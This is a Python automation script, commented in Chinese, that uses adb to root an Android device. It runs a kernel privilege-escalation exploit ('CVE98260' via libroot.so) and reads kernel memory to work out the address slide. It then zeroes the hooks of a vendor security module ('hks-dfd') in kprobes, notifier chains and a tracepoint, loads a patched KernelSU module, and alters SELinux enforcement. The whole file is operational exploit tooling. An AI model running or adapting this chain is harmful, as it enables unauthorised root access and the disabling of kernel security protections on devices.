
import subprocess, sys, time, re, os

ADB = os.environ.get("NEO10_ADB") or "/usr/lib/android-sdk/platform-tools/adb"
WORK = os.environ.get("NEO10_WORK") or os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(WORK, "ksu_enable.log")

def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(line + "\n")

def adb(args, timeout=300):
    try:
        r = subprocess.run([ADB] + args, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        return r.stdout or "", r.stderr or ""
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT"

def dev(cmd, timeout=300):
    return adb(["shell", cmd], timeout)

def shq(s):
    return "'" + s.replace("'", "'\\''") + "'"

def rootcmd(cmd, timeout=300):
    return adb(["shell", "/data/local/tmp/libroot.so su -c " + shq(cmd)], timeout)

def parse_rkx(out):
    """rk.sh 的事件名是 rk<pid>，所以不能按固定 'rkx:' 找；直接抓 a=0x.. 这种字段。
    取最后一条含字段的 trace 行，避免旧行干扰。"""
    line = None
    for ln in out.splitlines():
        if re.search(r"\b[a-h]=0x[0-9a-fA-F]+", ln):
            line = ln
    if line is None:
        return []
    vals = []
    for m in re.finditer(r"\b([a-h])=(0x[0-9a-fA-F]+)", line):
        vals.append(int(m.group(2), 16))
    return vals

def read_kernel(addrs):
    res = []
    for k in range(0, len(addrs), 6):
        chunk = addrs[k:k+6]
        args = " ".join(hex(a) for a in chunk)
        out, err = rootcmd("sh /data/local/tmp/rk.sh " + args)
        vals = parse_rkx(out)
        while len(vals) < len(chunk):
            vals.append(None)
        res.extend(vals[:len(chunk)])
    return res

SLIDE = 0

def rt(a):
    return a + SLIDE

def ensure_rootd():
    out, _ = dev("ls /data/local/tmp/pc98260-root.sock 2>&1")
    if "No such file" not in out:
        o2, _ = rootcmd("id -u", 60)
        if "0" in o2:
            log("rootd 已可用，跳过 exploit")
            return True
    log("正在运行 attempt.sh（exploit）…")
    dev("nohup sh /data/local/tmp/attempt.sh > /data/local/tmp/att_bg.txt 2>&1 &", 60)
    for i in range(160):
        time.sleep(5)
        o, _ = dev("tail -c 300 /data/local/tmp/att_out.txt 2>/dev/null", 60)
        if "ATTEMPT END" in o:
            log("attempt.sh 运行结束")
            break
    o2, _ = rootcmd("id -u", 60)
    if "0" in o2:
        log("rootd 已就绪")
        return True
    log("rootd 未就绪：" + o2.strip()[:200])
    return False

def get_slide():
    """读 slide 缓存，但必须校验 boot_id —— 重启后旧 slide 会把 zerosym 写错地址导致崩溃。"""
    global SLIDE
    boot, _ = dev("cat /proc/sys/kernel/random/boot_id", 60)
    boot = boot.strip()
    o, _ = dev("cat /data/local/tmp/slide_cache.txt", 60)
    lines = [x.strip() for x in o.splitlines() if x.strip()]
    if len(lines) >= 2 and lines[0] == boot:
        try:
            SLIDE = int(lines[1], 16)
        except ValueError:
            log("slide 缓存解析失败，忽略")
            return False
        log("slide=%#x（本次开机 %s）" % (SLIDE, boot[:8]))
        return True
    if lines:
        log("slide 缓存属于另一次开机（%s ≠ %s），忽略" % (lines[0][:8], boot[:8]))
    else:
        log("无 slide 缓存")
    return False

def find_load_module_node():
    kt = rt(0xffffffc00a47d938)
    lm = rt(0xffffffc008186f50)
    b = ((lm * 0x61C8864680B583EB) >> 58) & 63
    first = read_kernel([kt + b*8])[0]
    log("kprobe 哈希桶=%d 表头=%s" % (b, hex(first) if first else "0"))
    node = first
    for _ in range(24):
        if not node:
            return None
        nxt, addr, pre = read_kernel([node, node+0x28, node+0x40])
        if addr == lm:
            return node, pre
        node = nxt if nxt else 0
    return None

def find_member_field(aggr):
    lm = rt(0xffffffc008186f50)
    aggr_pre = rt(0xffffffc0081e746c)
    kre_pre = rt(0xffffffc0081e868c)
    lst = aggr + 0x10
    nxt = read_kernel([lst])[0]
    seen = set()
    for _ in range(12):
        if not nxt or nxt in seen:
            break
        seen.add(nxt)
        kp = nxt - 0x10
        addr, pre, nn = read_kernel([kp+0x28, kp+0x40, nxt])
        log("  成员 %s 地址=%s pre=%s" % (hex(kp), hex(addr) if addr else "0", hex(pre) if pre else "0"))
        if addr == lm and pre and pre != aggr_pre and pre != kre_pre:
            return kp + 0x40
        nxt = nn
    return None

def find_notifier_break():
    head = rt(0xffffffc00a29e380) + 0x40
    text_lo = rt(0xffffffc008000000)
    node = read_kernel([head])[0]
    prev = None
    prev_prev = None
    for i in range(30):
        if not node:
            return None
        call, nxt = read_kernel([node, node+8])
        low = call and call < text_lo
        log("  通知块[%d] 节点=%s 回调=%s%s" % (i+1, hex(node), hex(call) if call else "0", "  <-- hks-dfd" if low else ""))
        if low and not (prev and prev < text_lo):
            return prev + 8
        prev_prev = prev
        prev = node
        node = nxt if nxt else 0
    return None

def find_sys_exit_hks_field():
    """hks-dfd 挂在 __tracepoint_sys_exit 的 funcs 数组里（func1）。
    tracepoint 遍历时 while ((++it_func_ptr)->func) 遇到 func==NULL 即停止，
    所以把 func1 槽清零 = 立刻摘掉 hks-dfd，同时保留 func0（rsc_syscall_exit_hook）。
    注意 hks-dfd 模块基址每个 boot 都变，必须运行时读，不能缓存。"""
    tp = rt(0xffffffc00a3fccc0)          # __tracepoint_sys_exit
    funcs_ptr = read_kernel([tp + 0x40])[0]
    if not funcs_ptr:
        log("sys_exit：funcs 指针为空")
        return None
    arr = read_kernel([funcs_ptr, funcs_ptr + 0x18])   # func0, func1
    f0 = arr[0] if len(arr) > 0 else None
    f1 = arr[1] if len(arr) > 1 else None
    log("sys_exit 函数表=%s func0=%s func1=%s" % (
        hex(funcs_ptr), hex(f0) if f0 else "0", hex(f1) if f1 else "0"))
    if not f1:
        log("sys_exit：func1 已为空，hks-dfd 不在此 tracepoint 上")
        return None
    text_lo = rt(0xffffffc008000000)
    if f1 >= text_lo:
        log("sys_exit：func1 在内核文本内，非 hks-dfd——跳过")
        return None
    return funcs_ptr + 0x18

def run_zerosym(links):
    zs = ",".join(hex(x) for x in links)
    script = """#!/system/bin/sh
cd /data/local/tmp || exit 1
echo 1 > /sys/kernel/tracing/events/kmem/rss_stat/enable
rm -f /data/local/tmp/zs_tmp.log
CVE98260_LOG=/data/local/tmp/zs_tmp.log CVE98260_ZERO_SYMS=%s CVE98260_SELINUX_ONLY=1 PLANT_FAST=1 \\
  nohup timeout -k 5 400 ./libroot.so exploit --slide $(sed -n 2p /data/local/tmp/slide_cache.txt) \\
  --page-offset 0xffffff7f80000000 < cve98260/profile.framed > /dev/null 2>&1 &
i=0
while [ $i -lt 260 ]; do
  if grep -aq 'parked' /data/local/tmp/zs_tmp.log 2>/dev/null; then echo PARKED_DONE; break; fi
  sleep 1
  i=$((i+1))
done
grep -a zerosym /data/local/tmp/zs_tmp.log
""" % zs
    p = os.path.join(WORK, "zs_run.sh")
    with open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(script)
    adb(["push", p, "/data/local/tmp/zs_run.sh"], 120)
    o, _ = dev("sh /data/local/tmp/zs_run.sh", 420)
    return o

def clear_targets(runtime_addrs):
    """runtime_addrs -> list of link addrs; loop until all read 0"""
    links = [a - SLIDE for a in runtime_addrs]
    for rd in range(1, 7):
        cur = read_kernel(runtime_addrs)
        todo = [runtime_addrs[i] for i, v in enumerate(cur) if v != 0]
        if not todo:
            log("所有门禁已清零")
            return True
        log("清零第 %d 轮：剩余目标 %d 个" % (rd, len(todo)))
        out = run_zerosym([a - SLIDE for a in todo])
        for line in out.splitlines():
            if "zerosym" in line:
                log("  " + line.strip())
        time.sleep(1)
        cur2 = read_kernel(runtime_addrs)
        log("  第 %d 轮后：%s" % (rd, [hex(v) if v else "0" for v in cur2]))
        if all(v == 0 for v in cur2):
            log("所有门禁已清零")
            return True
    cur3 = read_kernel(runtime_addrs)
    log("仍未清零：%s" % ([hex(v) if v else "0" for v in cur3]))
    return False

def prep_and_insmod():
    o, e = rootcmd("cd /data/local/tmp && ls -l ksu-final.ko", 60)
    log("insmod ko 输出：" + o.strip())
    o, e = rootcmd("/data/local/tmp/prep_patch "
                   "/data/local/tmp/ksu-final.ko /data/local/tmp/syms_local.txt "
                   + hex(SLIDE) + " /data/local/tmp/ksu-ready.ko", 300)
    log("prep_patch 输出：" + (o + e).strip().replace("\n", " | "))
    script = """#!/system/bin/sh
cd /data/local/tmp || exit 1
insmod /data/local/tmp/ksu-ready.ko allow_shell=1
echo insmod_rc=$?
"""
    p = os.path.join(WORK, "ins_run.sh")
    with open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(script)
    adb(["push", p, "/data/local/tmp/ins_run.sh"], 120)
    o, _ = rootcmd("sh /data/local/tmp/ins_run.sh", 180)
    log("insmod 结果：" + o.strip().replace("\n", " | "))
    time.sleep(2)
    o, _ = dev("grep kernelsu /proc/modules", 60)
    ok = "kernelsu" in o
    log("内核模块加载：" + ("YES" if ok else "NO") + "  " + o.strip()[:120])
    return ok

def selinux_down():
    script = """#!/system/bin/sh
cd /data/local/tmp || exit 1
echo 1 > /sys/kernel/tracing/events/kmem/rss_stat/enable
rm -f /data/local/tmp/sel_tmp.log
CVE98260_LOG=/data/local/tmp/sel_tmp.log CVE98260_SELINUX_ONLY=1 PLANT_FAST=1 \\
  nohup timeout -k 5 300 ./libroot.so exploit --slide $(sed -n 2p /data/local/tmp/slide_cache.txt) \\
  --page-offset 0xffffff7f80000000 < cve98260/profile.framed > /dev/null 2>&1 &
i=0
while [ $i -lt 180 ]; do
  if grep -aq 'parked' /data/local/tmp/sel_tmp.log 2>/dev/null; then break; fi
  sleep 1
  i=$((i+1))
done
cat /sys/fs/selinux/enforce
"""
    p = os.path.join(WORK, "sel_run.sh")
    with open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(script)
    adb(["push", p, "/data/local/tmp/sel_run.sh"], 120)
    o, _ = dev("sh /data/local/tmp/sel_run.sh", 320)
    log("SELinux 切回 Enforce：" + o.strip()[-3:])
    return o.strip().endswith("0")

def pin_rootd_ksu():
    """把常驻 rootd 迁到 KernelSU 的 u:r:ksu:s0 域。

    实测（boot 02645cc7）：Enforcing 下 shell 域的 rootd 自己 accept4() 返回 EACCES，
    监听器被第一个客户端打死，rootd 通道整体消失；ksu 域下 accept 正常。
    KSU 的 late-load 会把 SELinux 强制拉回 Enforcing，所以必须固定到 ksu 域。
    走 su（KSU 通道）拉起，保证新进程继承 ksu 域。"""
    src = os.path.join(WORK, "rootd_ksu.sh")
    if not os.path.exists(src):
        log("rootd_ksu.sh 缺失，跳过 rootd 域迁移")
        return False
    adb(["push", src, "/data/local/tmp/rootd_ksu.sh"], 120)
    o, e = dev("su -c 'sh /data/local/tmp/rootd_ksu.sh'", 180)
    tail = [ln for ln in (o or "").splitlines() if ln.strip()]
    for ln in tail[-6:]:
        log("  " + ln)
    ok = "OK" in (o or "") or "nothing to do" in (o or "")
    log("rootd 域迁移结果：" + ("ok (u:r:ksu:s0)" if ok else "FAILED"))
    return ok

def verify_su():
    o, _ = dev("su -c 'id; cat /proc/self/attr/current; getenforce'", 90)
    log("su 验证：" + o.strip().replace("\n", " | "))
    ok = "uid=0" in o
    i2, _ = dev("su -c '/data/adb/ksud debug info'", 90)
    flags = {}
    for line in i2.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            flags[k.strip()] = v.strip()
    log("ksud 信息：lkm=%s late_load=%s 运行模式=%s 版本=%s 管理器=%s" % (
        flags.get("lkm"), flags.get("late_load"), flags.get("runtime_mode"),
        flags.get("version"), (dev("su -c '/data/adb/ksud debug package'", 60)[0] or "").strip()))
    return ok and flags.get("lkm") == "true"

def main():
    probe_only = "--probe" in sys.argv
    log("=" * 60)
    log("KernelSU 加载流程开始")
    if not get_slide():
        log("暂无 slide 缓存——attempt.sh 会先创建")
    if not ensure_rootd():
        return 3
    if not get_slide():
        log("attempt 之后仍无 slide 缓存，中止")
        return 2
    o, _ = dev("grep kernelsu /proc/modules", 60)
    if "kernelsu" in o:
        log("KernelSU 已加载，跳过 insmod")
        # 模块已加载 ≠ hks-dfd 已摘除：sys_exit 的 func 槽每次 boot 都会被重新注册，
        # 不重清的话「打开 KSU 管理器 → hks-dfd 在 sys_exit 里 do_exit」照样会杀进程。
        se = find_sys_exit_hks_field()
        if se:
            log("hks-dfd sys_exit 函数槽位=%s（重新清零）" % hex(se))
            if not clear_targets([se]):
                log("警告：sys_exit 解钩失败，KSU 管理器可能闪退")
        if not verify_su():
            selinux_down()
            verify_su()
        pin_rootd_ksu()
        return 0
    node = find_load_module_node()
    if not node:
        log("失败：找不到 load_module kprobe 节点")
        return 4
    aggr, pre = node
    log("聚合节点=%s pre=%s" % (hex(aggr), hex(pre) if pre else "0"))
    mf = find_member_field(aggr)
    if not mf:
        log("失败：找不到 hks-dfd 成员的 pre_handler 字段")
        return 5
    log("hks-dfd kprobe pre_handler 字段=%s" % hex(mf))
    nb = find_notifier_break()
    if not nb:
        log("失败：找不到 notifier 的 break 字段")
        return 6
    log("notifier break 字段=%s" % hex(nb))
    targets = [mf, nb]
    se = find_sys_exit_hks_field()
    if se:
        log("hks-dfd sys_exit 函数槽位=%s" % hex(se))
        targets.append(se)
    if not clear_targets(targets):
        return 7
    if probe_only:
        log("探测模式：门禁已清，跳过 insmod")
        return 0
    if not prep_and_insmod():
        return 8
    selinux_down()
    # 自愈（对齐 fucroot 的 VR_PATCH_REVERTED self_heal）：加载模块 / 降 SELinux 之后
    # 再复查一次 sys_exit 的 func1 槽，万一被重新装回去就当场再清一次。
    se2 = find_sys_exit_hks_field()
    if se2:
        log("hks-dfd sys_exit 槽位复活（%s），重新清零" % hex(se2))
        if not clear_targets([se2]):
            log("警告：sys_exit 重新清零失败，KSU 管理器可能闪退")
    else:
        log("sys_exit 槽位仍为空（自愈检查通过）")
    ok = verify_su()
    if ok:
        # rootd 必须落在 ksu 域：Enforcing 下 shell 域的 rootd 连 accept 都会被拒。
        pin_rootd_ksu()
    log("最终结果：" + ("成功——KSU su 已可用" if ok else "su 不可用"))
    return 0 if ok else 9

if __name__ == "__main__":
    sys.exit(main())